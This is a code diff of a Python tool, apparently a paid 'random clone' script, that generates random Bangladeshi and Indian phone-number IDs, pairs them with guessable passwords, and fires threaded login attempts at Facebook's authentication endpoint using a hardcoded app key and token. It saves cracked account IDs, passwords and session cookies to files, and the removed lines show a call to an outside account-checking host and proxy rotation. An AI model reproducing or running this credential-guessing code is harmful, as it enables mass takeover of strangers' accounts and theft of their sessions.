@@ -72,7 +72,7 @@ logo=(f"""
 {A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {G1}[{A}≈{G1}]{G1} DEVELOPER {A}➢{G1} MASUM\_____ :* \❷/ 3:) \⓿
 {G1}[{A}≈{G1}]{G1} TOOLTYPE  {A}➢{G1} FILE {A}&{G1} RANDOM CLONE
-{G1}[{A}≈{G1}]{G1} VERSION   {A}➢{A} V{G1}/{A}1.4
+{G1}[{A}≈{G1}]{G1} VERSION   {A}➢{A} V{G1}/{A}0.1
 {G1}[{A}≈{G1}]{G1} STATUS    {A}➢{A} PAID
 {A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
 #__________________MAIN____________#
@@ -95,55 +95,57 @@ def menu():
     else:
         menu()
 #__________________RANDOM DEF____________#
-def XXX():
+def XXX():   
     clear()
-    print(f'{G1}[{A}1{G1}]{G1} BANGLADESH CLONE')
-    print(f'{G1}[{A}2{G1}]{G1} INDIA CLONE')
-    print(f'{G1}[{A}0{G1}]{G1} BACK MENU');linex()
-    sex = input(f'{G1}[{A}?{G1}]{G1} CHOICE {A}➢{G1} ')
-    if sex in ['1']:
+    print(f'{G1}[{A}1{G1}]{G1} BANGLADESH CLONING')
+    print(f'{G1}[{A}2{G2}]{G2} INDIA CLONING')
+    print(f'{G1}[{A}0{G3}]{G3} BACK TO MAIN MENU')
+    linex()
+    select = input(f'{G1}[{A}?{G5}]{G5} CHOICE {A}:{G5} ')
+    if select =='1':
         bd()
-    elif sex in ['2']:
-        India()
-    elif sex in ['0']:
+        
+    elif select =='2':
+        _India_()
+        
+    elif select =='0':
     	menu()
+        
     else:
-       oks=[]
-       cps=[]
+        print(f'{G1}[{A}={G2}]{G2} VALID OPTION')
+        time.sleep(2)
+        randm()
         
 #__________________BD DEF____________#
 def bd():
-    
-    print(f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} 017{G}/{A}019{G}/{A}018{G}/{A}016');linex()
-    code = input(f'{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} ')
     clear()
-    print(f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} 3000{G}/{A}5000{G}/{A}10000{G}/{A}99999');linex()
-    limit = int(input(f'{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} '))
+    print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} 017{A}/{G1}019{A}/{G1}018{A}/{G1}016');linex()
+    code = input(f'{G1}[{A}?{G2}]{G2} CHOICE  {A}:{G2} ')
+    name = ''.join(random.choice(string.digits) for _ in range(2))
+    cod = ''.join(random.choice(string.digits) for _ in range(2))
+    clear()
+    print(f'{G1}[{A}={G3}]{G3} EXAMPLE {A}:{G3} 3000{A}/{G3}5000{A}/{G3}10000{A}/{G3}99999');linex()
+    limit = int(input(f'{G1}[{A}?{G4}]{G4} CHOICE  {A}:{G4} '))
     for x in range(limit):
-        nmp = "". join(random.choice(string.digits) for _ in range(8))
+        nmp = ''.join(random.choice(string.digits) for _ in range(4))
         user.append(nmp)
     clear()
     with ThreadPool(max_workers=30) as sexy:
         clear()
-        print(f'{G1}[{A}≈{G1}]{G1} SIM CODE  {A}➢{A} {code}')
-        print(f'{G1}[{A}≈{G1}]{G1} TOTAL UID {A}➢{A} {str(len(user))}')
-        print(f"{G1}[{A}={G1}]{G1} TURN {G1}[{A}ON{G1}/{A}OFF{G1}] AIRPLANE MODE EVERY {A}3{G1} MIN");linex()
+        print(f'{G1}[{A}={G1}]{G1} SIM CODE  {A}:{G1} {code}')
+        print(f'{G1}[{A}={G2}]{G2} TOTAL UID {A}:{G2} {str(len(user))}')
+        print(f'{G1}[{A}={G3}]{G3} TURN {G3}[{A}ON{A}/{A}OFF{G3}]{G3} AIRPLANE MODE EVERY {A}3{G3} MIN');linex()
         for love in user:
-            ids = code + love
-            ax = ids[:8]
-            bx = ids[:7]
-            cx = ids[:6]
-            xa = love[1:]
-            xb = love[2:]
-            psd = [ids,love,ax,bx,cx,xa,xb,'77889900','bangladesh','bangla','jannat','jannatul','mariya','sadiya','farjana','sabbir','rakibul','mahidul','nusrat','tamanna','mimmim','suraiya','alamin','arafat','bushra','roksana','tabassum','tanisha','tasnim']
-            sexy.submit(random,ids,psd)
+            ids = code+name+cod+love
+            psd = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
+            sexy.submit(randm,ids,psd)
     print('')
-    print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-    print(f'{G1}[{A}≈{G1}]{G1} THE PROCESS HAS BEEN COMPLETED')
-    print(f'{G1}[{A}≈{G1}]{G1} TOTAL OK ID {A}➢{G1} {str(len(ok))}')
-    print(f'{G1}[{A}≈{G1}]{M} TOTAL CP ID {A}➢{M} {str(len(cp))}')
-    print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-    input(f'{G1}[{A}≈{G1}]{G1} PRESS ENTER TO BACK ')
+    print(f'\r{A}──────────────────────────────────────────────────')
+    print(f'{G1}[{A}={G1}]{G1} THE PROCESS HAS BEEN COMPLETED')
+    print(f'{G1}[{A}={G2}]{G2} TOTAL OK ID {A}:{G2} {str(len(ok))}')
+    print(f'{G1}[{A}={G3}]{G3} TOTAL CP ID {A}:{G3} {str(len(cp))}')
+    print(f'\r{A}──────────────────────────────────────────────────')
+    input(f'{G1}[{A}={G4}]{G4} PRESS ENTER TO BACK ')
     menu()
 #__________________INDIA DEF______________#
 def India():
@@ -210,10 +212,8 @@ def file():
     menu()
 #__________________RANDON METHOD____________#
 def randm(ids,psd):
-    global loop,ok
-    nip=random.choice(prox)
-    proxs= {'http': 'socks4://'+nip}
-    sys.stdout.write(f'\r\r{A}[{G1}SWAG-XD{A}]-[{G1}{loop}{A}]-[{G1}OK{A}:{G1}{len(ok)}{A}] ')
+    global loop,ok,cp
+    sys.stdout.write(f"\r{G1}[{A}SWAG{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(ok)}{G1}/{A}{len(cp)}{G1}] ")
     sys.stdout.flush()
     try:
         for pas in psd:
@@ -238,35 +238,39 @@ def randm(ids,psd):
             'fb_api_req_friendly_name':'authenticate',
             'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
             'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
-            head={'User-Agent': sex(),
-            'Accept-Encoding':'gzip, deflate',
-            'Connection':'close',
-            'Content-Type':'application/x-www-form-urlencoded',
-            'Host':'graph.facebook.com',
-            'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
-            'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
-            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-            'X-FB-Connection-Type':'WIFI',
-            'X-Tigon-Is-Retry':'False',
-            'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
-            'x-fb-device-group':'5120',
-            'X-FB-Friendly-Name':'ViewerReactionsMutation',
-            'X-FB-Request-Analytics-Tags':'graphservice',
-            'X-FB-HTTP-Engine':'Liger',
-            'X-FB-Client-IP':'True',
-            'X-FB-Server-Cluster':'True',
-            'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
+            head={'user-agent': 'mbasic.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-BD,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+    'cache-control': 'max-age=0',
+    
+    'dpr': '1.7000000476837158',
+    'referer': 'https://mbasic.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2Fdevice-based%2Fpassword%2F%3Fuid%3D100029543623795%26flow%3Dlogin_no_pin%26refsrc%3Dhttps%253A%252F%252Fmbasic.facebook.com%252F&multiple_results=0&ars=device_based_login&from_login_screen=0&wtsid=rdr_0WaiHNRmuyi92A3I0&_rdr',
+    'sec-ch-prefers-color-scheme': 'dark',
+    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"CPH2591"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"14.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'ua',
+    'viewport-width': '980',
+}
             url = 'https://b-graph.facebook.com/auth/login'
             po = requests.post(url,data=data,headers=head,allow_redirects=False).text
             q = json.loads(po)
             if 'access_token' in q:
                 uid = str(q['uid'])
                 coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
-                res = requests.get(f"https://rajx.pythonanywhere.com/live?uid={uid}").text
-                if res == 'LIVE':
-                	print(f'\r\r{A}[{G1}SWAG-OK{A}]{G1} {uid} {A}|{G1} {pas}');open('/sdcard/SWAG-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n');ok.append(uid);break
-                if res == 'LOCK':
-                	print(f'\r\r{A}[{S}SWAG-LK{A}]{S} {uid} {A}|{S} {pas}');break
+                print(f'\r\r{G1}[SWAG-OK] {uid} | {pas}')
+                #print(f'\r\r{G1}[COOKIE]{A} {coki}')
+                open('/sdcard/TMT-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
+                ok.append(uid)
+                break
             else:continue
         loop+=1
     except Exception as e:
@@ -306,30 +310,35 @@ def M1(ids,names,psd):
             'fb_api_req_friendly_name':'authenticate',
             'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
             'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
-            head={'User-Agent': sex(),
-            'Accept-Encoding':'gzip, deflate',
-            'Connection':'close',
-            'Content-Type':'application/x-www-form-urlencoded',
-            'Host':'graph.facebook.com',
-            'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
-            'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
-            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-            'X-FB-Connection-Type':'WIFI',
-            'X-Tigon-Is-Retry':'False',
-            'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
-            'x-fb-device-group':'5120',
-            'X-FB-Friendly-Name':'ViewerReactionsMutation',
-            'X-FB-Request-Analytics-Tags':'graphservice',
-            'X-FB-HTTP-Engine':'Liger',
-            'X-FB-Client-IP':'True',
-            'X-FB-Server-Cluster':'True',
-            'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
+            head={'user-agent': 'mbasic.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-BD,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+    'cache-control': 'max-age=0',
+     'dpr': '1.7000000476837158',
+    'referer': 'https://mbasic.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2Fdevice-based%2Fpassword%2F%3Fuid%3D100029543623795%26flow%3Dlogin_no_pin%26refsrc%3Dhttps%253A%252F%252Fmbasic.facebook.com%252F&multiple_results=0&ars=device_based_login&from_login_screen=0&wtsid=rdr_0WaiHNRmuyi92A3I0&_rdr',
+    'sec-ch-prefers-color-scheme': 'dark',
+    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"CPH2591"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"14.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'ua',
+    'viewport-width': '980',
+}
             po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
             if 'access_token' in po:
                 print(f'\r\r{A}[{G1}SWAG-OK{A}]{G1} {ids} {A}|{G1} {pas}')
                 coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                 open('/sdcard/SWAG-FILE-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                 ok.append(ids)
+                print(f'\r\r{G1}[SWAG-OK] {uid} | {pas}')
+                 #print(f'\r\r{G1}[COOKIE]{A} {coki}')
                 print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 break
             elif 'www.facebook.com' in po['error']['message']:
